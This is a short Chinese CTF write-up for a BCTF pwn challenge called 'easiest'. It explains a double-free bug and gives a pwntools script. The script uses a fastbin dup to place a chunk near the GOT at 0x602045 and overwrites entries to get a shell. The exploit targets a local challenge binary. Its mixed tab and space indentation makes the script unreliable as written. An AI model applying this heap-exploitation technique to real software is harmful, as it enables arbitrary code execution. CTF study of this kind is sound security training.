文件运行效果图

```shell
ubuntu@VM-0-13-ubuntu:~/bctf $ ./easiest 
HI!
1 add 
2 delete
```

是一个double free 的漏洞。
没有开地址随机化，所以选择在add的时候添加到一个特定的位置，然后double free修改free或者malloc的got表地址，然后调用add或者delete，进而get shell
脚本如下

```python
#coding:utf8
from pwn import *
import sys

def add(id,size,content):
	p.sendlineafter("2 delete","1")
	p.sendlineafter("(0-11):",str(id))
        p.sendlineafter("Length:",str(size))
        p.sendlineafter("C:",content)

def free(id):
	p.sendlineafter("2 delete","2")
        p.sendlineafter("(0-11):",str(id))

def debugf():
	gdb.attach(p,"b *0x400D38")


context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
p=process("./1")
elf=ELF("./1")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
add(1,100,"aaaaaaaaaaaaaaaaaaaaaaaaa")

add(2,100,"bbbbbbbbbbbbbbbbbbbbbbbb")

if sys.argv[1]=="y":
         debugf()

free(1)
free(2)
free(1)
pause()
add(1,0x68,p64(0x602045))
add(2,0x68,"hh")
payload = '\x00\x00\x00' + p64(0x400946) * 6
add(3,0x68,"hhh")

add(4,0x68,payload)
p.interactive()
```
